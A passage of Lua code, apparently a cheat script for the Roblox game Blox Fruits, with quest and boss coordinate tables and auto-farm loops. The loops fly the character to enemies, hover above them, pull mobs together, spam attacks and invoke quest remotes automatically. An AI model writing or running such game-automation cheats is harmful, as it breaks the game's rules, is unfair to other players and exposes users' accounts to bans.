    {Sea = 3, Min = 2550, Max = 2574, Quest = "TikiQuest3", Level = 1, Mob = "Serpent Hunter", Pos = CFrame.new(-15120.12, 22.12, 110.34)},
    {Sea = 3, Min = 2575, Max = 3000, Quest = "TikiQuest3", Level = 2, Mob = "Skull Slayer", Pos = CFrame.new(-15400.45, 22.12, 350.12)}
}

local function GetCurrentQuest()
    local level = GetPlayerLevel()
    local best = nil
    for _, q in ipairs(QuestsDB) do
        if q.Sea == CurrentSea and level >= q.Min and level <= q.Max then
            return q
        end
        if q.Sea == CurrentSea then
            best = q
        end
    end
    return best or QuestsDB[1]
end

local function GetQuestNpcCFrame(questInfo)
    if not questInfo then return nil end
    local qName = (questInfo.Quest or ""):lower()
    local qMob = (questInfo.Mob or ""):lower()
    local npcs = Workspace:FindFirstChild("NPCs")
    if npcs then
        for _, npc in ipairs(npcs:GetChildren()) do
            if npc:IsA("Model") and (npc:FindFirstChild("HumanoidRootPart") or npc:FindFirstChild("Head")) then
                local nName = npc.Name:lower()
                local bbg = npc:FindFirstChildWhichIsA("BillboardGui", true)
                local bbgText = (bbg and bbg:FindFirstChild("Title") and bbg.Title.Text or ""):lower()
                local isQuestGiver = nName:find("quest") or bbgText:find("quest")
                
                if isQuestGiver then
                    local cleanQ = qName:gsub("quest", ""):gsub("%d+", ""):gsub("island", "")
                    if cleanQ ~= "" and nName:find(cleanQ, 1, true) then
                        return npc:GetPivot()
                    end
                    if (qName:find("tiki") and nName:find("tiki"))
                        or (qName:find("port") and nName:find("port"))
                        or (qName:find("forest") and (nName:find("forest") or nName:find("turtle")))
                        or (qName:find("dragon") and (nName:find("dragon") or nName:find("hydra")))
                        or (qName:find("venom") and (nName:find("venom") or nName:find("hydra")))
                        or (qName:find("haunted") and nName:find("haunted"))
                        or (qName:find("nuts") and (nName:find("nuts") or nName:find("peanut")))
                        or (qName:find("icecream") and (nName:find("ice") or nName:find("cream")))
                        or (qName:find("cake") and nName:find("cake"))
                        or (qName:find("choc") and (nName:find("choc") or nName:find("cocoa")))
                        or (qName:find("candy") and nName:find("candy"))
                        or (qName:find("area") and (nName:find("area") or nName:find("rose") or nName:find("mansion")))
                        or (qName:find("marine") and nName:find("marine"))
                        or (qName:find("zombie") and (nName:find("zombie") or nName:find("graveyard")))
                        or (qName:find("snow") and (nName:find("snow") or nName:find("frost")))
                        or (qName:find("ship") and nName:find("ship"))
                        or (qName:find("forgotten") and nName:find("forgotten"))
                        or (qName:find("desert") and nName:find("desert"))
                        or (qName:find("jungle") and (nName:find("adventurer") or nName:find("jungle")))
                        or (qName:find("buggy") and (nName:find("pirate") or nName:find("buggy")))
                        or (qName:find("sky") and nName:find("sky"))
                        or (qName:find("prisoner") and (nName:find("jail") or nName:find("prisoner")))
                        or (qName:find("colosseum") and nName:find("colosseum"))
                        or (qName:find("magma") and nName:find("magma"))
                        or (qName:find("fishman") and nName:find("fishman"))
                        or (qName:find("fountain") and nName:find("fountain")) then
                        return npc:GetPivot()
                    end
                end
            end
        end
    end
    if questInfo.NpcPos then return questInfo.NpcPos end
    for _, q in ipairs(QuestsDB) do
        if q.Quest == questInfo.Quest and q.Level == 1 then
            return q.NpcPos or q.Pos
        end
    end
    return questInfo.NpcPos or questInfo.Pos
end

-- Inspect active quest target name from GUI or Data
local function GetActiveQuestTarget()
    local pGui = LocalPlayer:FindFirstChild("PlayerGui")
    if pGui then
        local tq = pGui:FindFirstChild("TrackedQuestFrame")
        if tq and tq:FindFirstChild("Frame") and tq.Frame.Visible then
            local desc = tq.Frame:FindFirstChild("description")
            if desc and desc:IsA("TextLabel") and desc.Text ~= "" then
                return desc.Text
            end
            local hdr = tq.Frame:FindFirstChild("header")
            if hdr then
                local txt = hdr:FindFirstChild("textLabel")
                if txt and txt:IsA("TextLabel") and txt.Text ~= "" then
                    return txt.Text
                end
            end
        end
        local main = pGui:FindFirstChild("Main")
        if main then
            local q = main:FindFirstChild("Quest")
            if q and q.Visible then
                local container = q:FindFirstChild("Container")
                local qTitle = container and container:FindFirstChild("QuestTitle")
                local title = qTitle and qTitle:FindFirstChild("Title")
                if title and title.Text ~= "" and not title.Text:find("QUEST") then
                    return title.Text
                end
            end
        end
    end
    local data = LocalPlayer:FindFirstChild("Data")
    if data then
        local qVal = data:FindFirstChild("Quest")
        if qVal and qVal:IsA("StringValue") and qVal.Value ~= "" then
            return qVal.Value
        end
    end
    return ""
end

-- Strictly and authoritatively check if a quest is active
local function HasQuest()
    local pGui = LocalPlayer:FindFirstChild("PlayerGui")
    if pGui then
        -- 1. Modern Blox Fruits TrackedQuestFrame
        local tq = pGui:FindFirstChild("TrackedQuestFrame")
        if tq and tq:FindFirstChild("Frame") and tq.Frame.Visible then
            return true
        end
        -- 2. Classic / Main Quest Container (Strictly require q.Visible)
        local main = pGui:FindFirstChild("Main")
        if main then
            local q = main:FindFirstChild("Quest")
            if q and q.Visible then
                return true
            end
        end
    end
    return false
end
--============================== MASTER BOSS DATABASE ==============================
BossesDB = {
    -- Sea 1 (First Sea)
    ["The Gorilla King"] = {Sea = 1, Quest = "JungleQuest", Level = 3, Pos = CFrame.new(-1194.0, 10.0, -550.0)},
    ["Bobby"] = {Sea = 1, Quest = "BuggyQuest1", Level = 3, Pos = CFrame.new(-1146.47, 77.22, 4476.81)},
    ["The Saw"] = {Sea = 1, Quest = nil, Level = 1, Pos = CFrame.new(-682.12, 15.23, 1582.45)},
    ["Yeti"] = {Sea = 1, Quest = "SnowQuest", Level = 3, Pos = CFrame.new(1181.0, 104.0, -1617.0)},
    ["Mob Leader"] = {Sea = 1, Quest = "DesertQuest", Level = 3, Pos = CFrame.new(-2881.0, 6.0, 5430.0)},
    ["Vice Admiral"] = {Sea = 1, Quest = "MarineQuest2", Level = 2, Pos = CFrame.new(-5011.0, 15.0, 4383.0)},
    ["Warden"] = {Sea = 1, Quest = "PrisonerQuest", Level = 3, Pos = CFrame.new(5623.0, 1.0, 733.0)},
    ["Chief Warden"] = {Sea = 1, Quest = "PrisonerQuest", Level = 4, Pos = CFrame.new(5175.23, 5.65, 735.45)},
    ["Swan"] = {Sea = 1, Quest = "PrisonerQuest", Level = 5, Pos = CFrame.new(5230.12, 5.65, 760.34)},
    ["Magma Admiral"] = {Sea = 1, Quest = "MagmaQuest", Level = 3, Pos = CFrame.new(-5626.0, 55.0, 8623.0)},
    ["Fishman Lord"] = {Sea = 1, Quest = "FishmanQuest", Level = 3, Pos = CFrame.new(61352.0, 67.0, 1029.0)},
    ["Wyper"] = {Sea = 1, Quest = "SkyExp1Quest", Level = 3, Pos = CFrame.new(-7894.62, 5545.49, -380.41)},
    ["Thunder God"] = {Sea = 1, Quest = "SkyExp2Quest", Level = 3, Pos = CFrame.new(-7748.21, 5606.84, -1443.43)},
    ["Cyborg"] = {Sea = 1, Quest = nil, Level = 1, Pos = CFrame.new(6252.0, 9.0, 4941.0)},
    ["Saber Expert"] = {Sea = 1, Quest = nil, Level = 1, Pos = CFrame.new(-1528.0, 34.0, -34.0)},

    -- Sea 2 (Second Sea)
    ["Diamond"] = {Sea = 2, Quest = "Area1Quest", Level = 3, Pos = CFrame.new(-1580.45, 198.12, -210.34)},
    ["Jeremy"] = {Sea = 2, Quest = "Area2Quest", Level = 3, Pos = CFrame.new(2315.12, 449.12, 785.45)},
    ["Fajita"] = {Sea = 2, Quest = "MarineQuest3", Level = 3, Pos = CFrame.new(-2090.23, 72.96, -4210.12)},
    ["Don Swan"] = {Sea = 2, Quest = nil, Level = 1, Pos = CFrame.new(2285.45, 15.12, 860.23)},
    ["Smoke Admiral"] = {Sea = 2, Quest = "IceSideQuest", Level = 2, Pos = CFrame.new(-5075.23, 15.96, -5360.45)},
    ["Awakened Ice Admiral"] = {Sea = 2, Quest = "FrostQuest", Level = 3, Pos = CFrame.new(6472.12, 296.12, -6852.34)},
    ["Tide Keeper"] = {Sea = 2, Quest = "ForgottenQuest", Level = 3, Pos = CFrame.new(-3810.45, 77.15, -11520.12)},
    ["Darkbeard"] = {Sea = 2, Quest = nil, Level = 1, Pos = CFrame.new(3780.03, 22.65, -3498.94), Special = true},
    ["Cursed Captain"] = {Sea = 2, Quest = nil, Level = 1, Pos = CFrame.new(915.24, 180.12, 33458.12), Special = true},
    ["Order"] = {Sea = 2, Quest = nil, Level = 1, Pos = CFrame.new(-6500.12, 250.12, -4500.12), Special = true},

    -- Sea 3 (Third Sea)
    ["Stone"] = {Sea = 3, Quest = "PiratePortQuest", Level = 3, Pos = CFrame.new(-1050.23, 40.12, 6780.45)},
    ["Island Emperor"] = {Sea = 3, Quest = "DragonCrewQuest", Level = 3, Pos = CFrame.new(5700.12, 601.23, 210.45)},
    ["Kilo Admiral"] = {Sea = 3, Quest = nil, Level = 1, Pos = CFrame.new(2880.23, 1682.80, -7250.12)},
    ["Captain Elephant"] = {Sea = 3, Quest = "DeepForestIsland2", Level = 3, Pos = CFrame.new(-13390.23, 332.12, -8420.45)},
    ["Beautiful Pirate"] = {Sea = 3, Quest = "DeepForestIsland3", Level = 5, Pos = CFrame.new(-12463.87, 374.91, -7523.77)},
    ["Longma"] = {Sea = 3, Quest = nil, Level = 1, Pos = CFrame.new(5220.12, 385.12, -340.23)},
    ["Soul Reaper"] = {Sea = 3, Quest = nil, Level = 1, Pos = CFrame.new(-9516.99, 172.01, 6078.47), Special = true},
    ["Cake Queen"] = {Sea = 3, Quest = "IceCreamIslandQuest", Level = 3, Pos = CFrame.new(-710.23, 381.12, -11150.45)},
    ["Cake Prince"] = {Sea = 3, Quest = nil, Level = 1, Pos = CFrame.new(-2100.12, 70.12, -12150.34), Special = true},
    ["Dough King"] = {Sea = 3, Quest = nil, Level = 1, Pos = CFrame.new(-2100.12, 70.12, -12150.34), Special = true},
    ["Rip Indra"] = {Sea = 3, Quest = nil, Level = 1, Pos = CFrame.new(-5330.12, 314.52, -2780.45), Special = true},
    ["Tyrant of the Skies"] = {Sea = 3, Quest = nil, Level = 1, Pos = CFrame.new(-16300.12, 850.12, 450.23), Special = true}
}

--============================== DYNAMIC SCAN FUNCTIONS (SEA FILTERED) ==============================
local function GetSpawnedMobsList()
    CurrentSea = DetectSea()
    SeaName = (CurrentSea == 3 and "Third Sea") or (CurrentSea == 2 and "Second Sea") or "First Sea"
    
    local list = {}
    local seen = {}
    
    local function AddMob(name, isSpawned)
        if not name or name == "" then return end
        local clean = name:gsub("%s*%[.-%]%s*", " "):gsub("^%s+", ""):gsub("%s+$", "")
        if clean == "" or seen[clean] then return end
        if BossesDB and BossesDB[clean] then return end
        seen[clean] = true
        if isSpawned then
            table.insert(list, "[Spawned] " .. clean)
        else
            table.insert(list, clean)
        end
    end
    
    local enemies = Workspace:FindFirstChild("Enemies")
    if enemies then
        for _, enemy in ipairs(enemies:GetChildren()) do
            if enemy:IsA("Model") and enemy:FindFirstChild("Humanoid") and enemy.Humanoid.Health > 0 then
                AddMob(enemy.Name, true)
            end
        end
    end
    
    local chars = Workspace:FindFirstChild("Characters")
    if chars then
        for _, c in ipairs(chars:GetChildren()) do
            if c:IsA("Model") and c:FindFirstChild("Humanoid") and c.Humanoid.Health > 0 and not Players:GetPlayerFromCharacter(c) then
                AddMob(c.Name, true)
            end
        end
    end

    local spawnsFolder = Workspace:FindFirstChild("_WorldOrigin") and Workspace._WorldOrigin:FindFirstChild("EnemySpawns")
    if spawnsFolder then
        for _, s in ipairs(spawnsFolder:GetChildren()) do
            if not s.Name:find("Boss") and not s.Name:find("boss") then
                AddMob(s.Name, false)
            end
        end
    end
    
    for _, q in ipairs(QuestsDB) do
        if q.Sea == CurrentSea then
            AddMob(q.Mob, false)
        end
    end
    table.sort(list, function(a, b)
        local aSpawned = a:sub(1, 9) == "[Spawned]"
        local bSpawned = b:sub(1, 9) == "[Spawned]"
        if aSpawned ~= bSpawned then
            return aSpawned
        end
        return a < b
    end)
    return list
end

local function GetSpawnedBossesList()
    CurrentSea = DetectSea()
    SeaName = (CurrentSea == 3 and "Third Sea") or (CurrentSea == 2 and "Second Sea") or "First Sea"

    local list = {}
    local seen = {}

    local function CheckBossModel(enemy)
        if not enemy or not enemy:IsA("Model") then return end
        local hum = enemy:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return end

        for bName, bData in pairs(BossesDB) do
            if bData.Sea == CurrentSea and IsMobMatch(enemy.Name, bName) then
                if not seen[bName] then
                    seen[bName] = true
                    table.insert(list, "[Spawned] " .. bName)
                end
                break
            end
        end
    end

    -- 1. Scan live Workspace.Enemies (currently rendered on island / streamed)
    local enemies = Workspace:FindFirstChild("Enemies")
    if enemies then
        for _, enemy in ipairs(enemies:GetChildren()) do
            CheckBossModel(enemy)
        end
    end

    -- 2. Scan Workspace.Characters (special / summoned bosses)
    local chars = Workspace:FindFirstChild("Characters")
    if chars then
        for _, c in ipairs(chars:GetChildren()) do
            if not Players:GetPlayerFromCharacter(c) then
                CheckBossModel(c)
            end
        end
    end

    -- 3. Scan extra mob containers
    for _, fName in ipairs({"mobs", "Mobs", "SeaBeasts"}) do
        local f = Workspace:FindFirstChild(fName)
        if f then
            for _, m in ipairs(f:GetChildren()) do
                CheckBossModel(m)
            end
        end
    end

    -- 4. Include all standard island quest bosses across entire map ready to spawn (unstreamed distant islands)
    for bName, bData in pairs(BossesDB) do
        if bData.Sea == CurrentSea and not seen[bName] and not bData.Special then
            seen[bName] = true
            table.insert(list, bName)
        end
    end

    -- Sort [Spawned] bosses to the very top, followed by ready-to-spawn bosses alphabetically
    table.sort(list, function(a, b)
        local aSpawned = a:sub(1, 9) == "[Spawned]"
        local bSpawned = b:sub(1, 9) == "[Spawned]"
        if aSpawned ~= bSpawned then
            return aSpawned
        end
        return a < b
    end)

    if #list == 0 then
        return {"None Spawned (Click Refresh to Scan)"}
    end

    return list
end

-- Alias so both names work (UI uses GetActiveBossesList)
local GetActiveBossesList = GetSpawnedBossesList

-- ClearHover and FullResetMovement are defined above

local _knownMobPositions = {}
local _lockedMobSpawn = {}
local _mobSpawnPointsCache = {}
local _mobSpawnPatrolIndex = 1
local _lastMobPatrolStep = 0

-- Dynamic query to Workspace._WorldOrigin.EnemySpawns (reads live game spawn points directly)
local function GetAllMobSpawns(mobName)
    if not mobName then return {} end
    if _mobSpawnPointsCache[mobName] and #_mobSpawnPointsCache[mobName] > 0 then
        return _mobSpawnPointsCache[mobName]
    end
    
    local spawnsFolder = Workspace:FindFirstChild("_WorldOrigin") and Workspace._WorldOrigin:FindFirstChild("EnemySpawns")
    local list = {}
    if spawnsFolder then
        for _, s in ipairs(spawnsFolder:GetChildren()) do
            if IsMobMatch(s.Name, mobName) then
                local cf = s:IsA("BasePart") and s.CFrame or (s:FindFirstChildWhichIsA("BasePart") and s:FindFirstChildWhichIsA("BasePart").CFrame)
                if cf then
                    table.insert(list, cf)
                end
            end
        end
    end
    if #list > 0 then
        _mobSpawnPointsCache[mobName] = list
    end
    return list
end

local function GetTrueMobSpawnCFrame(mobName, questInfo)
    if not mobName then return nil end
    
    if _lockedMobSpawn[mobName] then
        return _lockedMobSpawn[mobName]
    end

    -- 1. Check live recorded position from recently active enemies
    if _knownMobPositions[mobName] then
        _lockedMobSpawn[mobName] = _knownMobPositions[mobName]
        return _knownMobPositions[mobName]
    end

    -- 2. Query official Game Spawn Markers from Workspace._WorldOrigin.EnemySpawns
    local spawns = GetAllMobSpawns(mobName)
    if #spawns > 0 then
        local root = GetRoot()
        local best = spawns[1]
        if root then
            local minD = math.huge
            for _, sp in ipairs(spawns) do
                local d = (sp.Position - root.Position).Magnitude
                if d < minD then
                    minD = d
                    best = sp
                end
            end
        end
        _lockedMobSpawn[mobName] = best
        return best
    end
    
    -- 3. Check BossesDB by exact name and fuzzy match
    if BossesDB and BossesDB[mobName] and BossesDB[mobName].Pos then
        _lockedMobSpawn[mobName] = BossesDB[mobName].Pos
        return BossesDB[mobName].Pos
    end
    if BossesDB then
        for bName, bData in pairs(BossesDB) do
            if IsMobMatch(bName, mobName) and bData.Pos then
                _lockedMobSpawn[mobName] = bData.Pos
                return bData.Pos
            end
        end
    end

    -- 4. Fallback to Quest Database MobPos / Pos
    if questInfo and questInfo.MobPos then
        _lockedMobSpawn[mobName] = questInfo.MobPos
        return questInfo.MobPos
    elseif questInfo and questInfo.Pos then
        _lockedMobSpawn[mobName] = questInfo.Pos
        return questInfo.Pos
    end
    
    -- 5. Fallback search across entire QuestsDB for mobName (current sea first, then any)
    for _, q in ipairs(QuestsDB) do
        if q.Sea == CurrentSea and IsMobMatch(q.Mob, mobName) then
            local cf = q.MobPos or q.Pos
            if cf then
                _lockedMobSpawn[mobName] = cf
                return cf
            end
        end
    end
    for _, q in ipairs(QuestsDB) do
        if IsMobMatch(q.Mob, mobName) then
            local cf = q.MobPos or q.Pos
            if cf then
                _lockedMobSpawn[mobName] = cf
                return cf
            end
        end
    end
    return nil
end

-- Find live enemy by name
local function FindEnemy(targetName)
    local enemies = Workspace:FindFirstChild("Enemies")
    if not enemies or #enemies:GetChildren() == 0 then
        for _, name in ipairs({"Enemies", "mobs", "Mobs", "Characters", "NPCs"}) do
            local f = Workspace:FindFirstChild(name)
            if f and #f:GetChildren() > 0 then enemies = f; break end
        end
    end
    if not enemies then return nil end
    local root = GetRoot()
    local closest, closestDist = nil, math.huge
    
    for _, mob in ipairs(enemies:GetChildren()) do
        if mob:IsA("Model") and IsMobMatch(mob.Name, targetName) then
            local hum = mob:FindFirstChildOfClass("Humanoid")
            local mRoot = GetMobRoot(mob)
            if hum and hum.Health > 0 and mRoot and not Validator.IsMobGlitched(mob) then
                _knownMobPositions[targetName] = mRoot.CFrame
                local dist = root and (mRoot.Position - root.Position).Magnitude or 0
                if dist < closestDist then
                    closestDist = dist
                    closest = mob
                end
            end
        end
    end
    return closest
end

--============================== AUTO FARM LEVEL CORE ==============================
local function StartAutoFarmLevel()
    task.spawn(function()
        task.wait(1.0)
        local _failedQuestAttempts = 0
        local isNavigatingToSpawn = false
        
        while true do
            task.wait(0.2)
            if _G.Config.AutoFarmLevel then
                pcall(function()
                    local char = GetCharacter()
                    if not char then return end
                    local hum = GetHumanoid()
                    local root = GetRoot()
                    if not hum or hum.Health <= 0 or not root then return end
                    
                    local questInfo = GetCurrentQuest()
                    local activeTarget = GetActiveQuestTarget()
                    if HasQuest() and activeTarget ~= "" then
                        local mobLower = questInfo.Mob:lower()
                        local actLower = activeTarget:lower()
                        if not actLower:find(mobLower) and not mobLower:find(actLower:gsub("s$", "")) then
                            LogBridgeEvent("QUEST", "Quest mismatch detected (active: " .. activeTarget .. " vs target: " .. questInfo.Mob .. "). Abandoning old quest...")
                            local cf = CommF()
                            if cf then
                                cf:InvokeServer("AbandonQuest")
                                task.wait(0.5)
                            end
                        end
                    end
                    
                    local target = FindEnemy(questInfo.Mob)
                    
                    if not HasQuest() and _failedQuestAttempts < 3 then
                        isNavigatingToSpawn = false
                        local npcCF = GetQuestNpcCFrame(questInfo)
                        local distToNPC = (npcCF.Position - root.Position).Magnitude
                        
                        if distToNPC > 25 then
                            TweenTo(npcCF * CFrame.new(0, 4, 0), "Quest NPC (" .. questInfo.Quest .. ")")
                        else
                            HoverLock(npcCF * CFrame.new(0, 4, 0))
                            local cf = CommF()
                            if cf then
                                local res = cf:InvokeServer("StartQuest", questInfo.Quest, questInfo.Level)
                                task.wait(0.4)
                                if HasQuest() or tostring(res) == "1" then
                                    _failedQuestAttempts = 0
                                else
                                    _failedQuestAttempts = _failedQuestAttempts + 1
                                end
                            end
                        end
                    else
                        -- Quest is active OR fallback after retries: engage mob or fly to spawn point
                        if target and target:FindFirstChild("HumanoidRootPart") then
                            isNavigatingToSpawn = false
                            _failedQuestAttempts = 0
                            local dist = GetOptimalFarmDistance(target)
                            local farmPos = target.HumanoidRootPart.CFrame * CFrame.new(0, dist, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                            local distToFarm = (farmPos.Position - root.Position).Magnitude
                            
                            if distToFarm < 15 then
                                HoverLock(farmPos)
                                if _G.Config.FastAttack and _G.Config.UseM1 then
                                    FastAttack()
                                end
                            else
                                TweenTo(farmPos, questInfo.Mob)
                            end
                            EquipWeapon(_G.Config.SelectedWeapon)
                            BringMobsTo(questInfo.Mob, target.HumanoidRootPart.CFrame)
                        else
                            -- Mobs not spawned yet: fly directly to TRUE spawn point and hover to trigger server proximity spawn!
                            local spawnCF = GetTrueMobSpawnCFrame(questInfo.Mob, questInfo)
                            if spawnCF then
                                local triggerPos = spawnCF * CFrame.new(0, 8, 0)
                                local distToTrigger = (triggerPos.Position - root.Position).Magnitude
                                if distToTrigger < 15 then
                                    isNavigatingToSpawn = false
                                    HoverLock(triggerPos)
                                    if not HasQuest() and _failedQuestAttempts >= 3 then
                                        _failedQuestAttempts = 0
                                    end
                                else
                                    if not isNavigatingToSpawn then
                                        isNavigatingToSpawn = true
                                        TweenTo(triggerPos, questInfo.Mob .. " Spawn Zone")
                                        task.spawn(function()
                                            local startNav = tick()
                                            while _G.Config.AutoFarmLevel and isNavigatingToSpawn and (triggerPos.Position - root.Position).Magnitude > 15 and (tick() - startNav) < 20 do
                                                task.wait(0.2)
                                                if FindEnemy(questInfo.Mob) then break end
                                            end
                                            isNavigatingToSpawn = false
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end)
            else
                isNavigatingToSpawn = false
            end
        end
    end)
end

local function StartAutoFarmSelectedMob()
    task.spawn(function()
        task.wait(0.1)
        local isNavigatingToSpawn = false
        
        while true do
            task.wait(0.2)
            if _G.Config.FarmSelectedMob then
                pcall(function()
                    local char = GetCharacter()
                    if not char then return end
                    local hum = GetHumanoid()
                    local root = GetRoot()
                    if not hum or hum.Health <= 0 or not root then return end
                    
                    if not _G.Config.SelectedMob or _G.Config.SelectedMob == "" then
                        local spawned = GetSpawnedMobsList()
                        if spawned and #spawned > 0 then
                            _G.Config.SelectedMob = spawned[1]
                        end
                    end
                    if _G.Config.SelectedMob and _G.Config.SelectedMob ~= "" then
                        local mobName = _G.Config.SelectedMob:gsub("^%[Spawned%] ", "")
                        local target = FindEnemy(mobName)
                        
                        if target and target:FindFirstChild("HumanoidRootPart") then
                            isNavigatingToSpawn = false
                            local dist = GetOptimalFarmDistance(target)
                            local farmPos = target.HumanoidRootPart.CFrame * CFrame.new(0, dist, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                            local distToFarm = (farmPos.Position - root.Position).Magnitude
                            if distToFarm < 15 then
                                HoverLock(farmPos)
                                if _G.Config.FastAttack and _G.Config.UseM1 then
                                    FastAttack()
                                end
                            else
                                TweenTo(farmPos, mobName)
                            end
                            EquipWeapon(_G.Config.SelectedWeapon)
                            BringMobsTo(mobName, target.HumanoidRootPart.CFrame)
                        else
                            -- Mob is NOT currently spawned in server:
                            -- Go to spawn area, hover safely in air, and WAIT for server proximity spawn!
                            local spawnCF = GetTrueMobSpawnCFrame(mobName)
                            if not spawnCF then
                                for _, q in ipairs(QuestsDB) do
                                    if q.Sea == CurrentSea and IsMobMatch(q.Mob, mobName) then
                                        spawnCF = q.MobPos or q.Pos
                                        break
                                    end
                                end
                            end
                            if not spawnCF and BossesDB then
                                for bName, bData in pairs(BossesDB) do
                                    if IsMobMatch(bName, mobName) and bData.Pos then
                                        spawnCF = bData.Pos
                                        break
                                    end
                                end
                            end
                            if spawnCF then
                                local waitPos = spawnCF * CFrame.new(0, 8, 0)
                                local distToWait = (waitPos.Position - root.Position).Magnitude
                                if distToWait < 15 then
                                    isNavigatingToSpawn = false
                                    HoverLock(waitPos)
                                    task.wait(0.25)
                                else
                                    if not isNavigatingToSpawn then
                                        isNavigatingToSpawn = true
                                        TweenTo(waitPos, mobName .. " Spawn Zone")
                                        task.spawn(function()
                                            local startNav = tick()
                                            while _G.Config.FarmSelectedMob and isNavigatingToSpawn and (waitPos.Position - root.Position).Magnitude > 15 and (tick() - startNav) < 20 do
                                                task.wait(0.2)
                                                if FindEnemy(mobName) then break end
                                            end
                                            isNavigatingToSpawn = false
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end)
            else
                isNavigatingToSpawn = false
            end
        end
    end)
end
local function StartAutoFarmSelectedBoss()
    task.spawn(function()
        task.wait(0.1)
        while true do
            task.wait(0.25)
            if _G.Config.FarmSelectedBoss then
                if not _G.Config.SelectedBoss or _G.Config.SelectedBoss == "" or _G.Config.SelectedBoss:find("None Spawned") then
                    local spawned = GetSpawnedBossesList()
                    if spawned and #spawned > 0 and not spawned[1]:find("None Spawned") then
                        _G.Config.SelectedBoss = spawned[1]
                    end
                end
                if _G.Config.SelectedBoss and _G.Config.SelectedBoss ~= "" and not _G.Config.SelectedBoss:find("None Spawned") then
                    pcall(function()
                        local bossName = _G.Config.SelectedBoss:gsub("^%[Spawned%] ", "")
                        local bossData = BossesDB[bossName]
                        local target = FindEnemy(bossName)
                        local root = GetRoot()
                        if not root then return end
                        
                        if target and target:FindFirstChild("HumanoidRootPart") then
                            if bossData and bossData.Quest and not HasQuest() then
                                local cf = CommF()
                                if cf then cf:InvokeServer("StartQuest", bossData.Quest, bossData.Level) end
                                task.wait(0.3)
                            end
                            local dist = GetOptimalFarmDistance(target)
                            local farmPos = target.HumanoidRootPart.CFrame * CFrame.new(0, dist, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                            local distToFarm = (farmPos.Position - root.Position).Magnitude
                            if distToFarm < 15 then
                                HoverLock(farmPos)
                                if _G.Config.FastAttack and _G.Config.UseM1 then
                                    FastAttack()
                                end
                            else
                                TweenTo(farmPos, bossName)
                            end
                            EquipWeapon(_G.Config.SelectedWeapon)
                        else
                            -- Boss NOT spawned: Travel to boss spawn platform and WAIT THERE!
                            local spawnCF = (bossData and bossData.Pos) or GetTrueMobSpawnCFrame(bossName)
                            if not spawnCF and BossesDB then
                                for bName, bData in pairs(BossesDB) do
                                    if IsMobMatch(bName, bossName) and bData.Pos then
                                        spawnCF = bData.Pos
                                        break
                                    end
                                end
                            end
                            if spawnCF then
                                local waitPos = spawnCF * CFrame.new(0, 8, 0)
                                local distToWait = (waitPos.Position - root.Position).Magnitude
                                if distToWait < 15 then
                                    HoverLock(waitPos)
                                    task.wait(0.25)
                                else
                                    TweenTo(waitPos, bossName .. " Spawn Platform")
                                end
                            end
                        end
                    end)
                end
            end
        end
    end)
end

--============================== AUTO FARM ALL BOSSES CORE ==============================
local _bossPatrolIndex = 1
local _bossSkipUntil = {}

local function StartAutoFarmAllBosses()
    task.spawn(function()
        task.wait(1.5)
        while true do
            task.wait(0.25)
            if _G.Config.FarmAllBosses then
                pcall(function()
                    local char = GetCharacter()
                    local hum = GetHumanoid()
                    local root = GetRoot()
                    if not char or not hum or hum.Health <= 0 or not root then return end
                    
                    -- Step 1: Scan for any spawned boss in Workspace.Enemies
                    local targetBoss = nil
                    local targetBData = nil
                    local enemies = Workspace:FindFirstChild("Enemies")
                    if enemies then
                        for _, enemy in ipairs(enemies:GetChildren()) do
                            if enemy:IsA("Model") and enemy:FindFirstChild("Humanoid") and enemy.Humanoid.Health > 0 and enemy:FindFirstChild("HumanoidRootPart") then
                                for bName, bData in pairs(BossesDB) do
                                    if bData.Sea == CurrentSea and IsMobMatch(enemy.Name, bName) then
                                        targetBoss = enemy
                                        targetBData = bData
                                        break
                                    end
                                end
                            end
                            if targetBoss then break end
                        end
                    end
                    
                    -- Step 2: If a boss is found, fight it!
                    if targetBoss and targetBoss.Parent and targetBoss:FindFirstChild("Humanoid") and targetBoss.Humanoid.Health > 0 and targetBoss:FindFirstChild("HumanoidRootPart") then
                        local dist = GetOptimalFarmDistance(targetBoss)
                        local farmPos = targetBoss.HumanoidRootPart.CFrame * CFrame.new(0, dist, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                        local distToFarm = (farmPos.Position - root.Position).Magnitude
                        
                        if distToFarm < 15 then
                            HoverLock(farmPos)
                            IsTravelingSky = false
                            if _G.Config.FastAttack and _G.Config.UseM1 then
                                FastAttack()
                            end
                        else
                            TweenTo(farmPos, targetBoss.Name)
                        end
                        EquipWeapon(_G.Config.SelectedWeapon)
                        return
                    end
                    
                    -- Step 3: If no boss is currently loaded in Workspace.Enemies, PATROL boss spawn points!
                    local bossList = {}
                    for bName, bData in pairs(BossesDB) do
                        if bData.Sea == CurrentSea and bData.Pos then
                            table.insert(bossList, {Name = bName, Data = bData})
                        end
                    end
                    
                    if #bossList > 0 then
                        local now = tick()
                        local candidate = nil
                        for i = 1, #bossList do
                            local idx = ((_bossPatrolIndex + i - 2) % #bossList) + 1
                            local b = bossList[idx]
                            if not _bossSkipUntil[b.Name] or now > _bossSkipUntil[b.Name] then
                                candidate = b
                                _bossPatrolIndex = idx
                                break
                            end
                        end
                        
                        if not candidate then
                            _bossSkipUntil = {}
                            candidate = bossList[1]
                            _bossPatrolIndex = 1
                        end
                        
                        if candidate then
                            local bossSpawnCF = GetTrueMobSpawnCFrame(candidate.Name) or candidate.Data.Pos
                            local checkPos = bossSpawnCF * CFrame.new(0, 15, 0)
                            local distToCheck = (checkPos.Position - root.Position).Magnitude
                            
                            if distToCheck > 25 then
                                TweenTo(checkPos, "Boss Patrol: " .. candidate.Name)
                            else
                                HoverLock(checkPos)
                                task.wait(1.0)
                                local found = false
                                if enemies then
                                    for _, enemy in ipairs(enemies:GetChildren()) do
                                        if enemy:IsA("Model") and enemy:FindFirstChild("Humanoid") and enemy.Humanoid.Health > 0 and IsMobMatch(enemy.Name, candidate.Name) then
                                            found = true
                                            break
                                        end
                                    end
                                end
                                if not found then
                                    _bossSkipUntil[candidate.Name] = now + 90
                                    _bossPatrolIndex = (_bossPatrolIndex % #bossList) + 1
                                    StopTween()
                                end
                            end
                        end
                    end
                end)
            end
        end
    end)
end
--============================== RAID & SPECIAL BOSSES ==============================
local function FightRaidBoss(bossName)
    local target = FindEnemy(bossName)
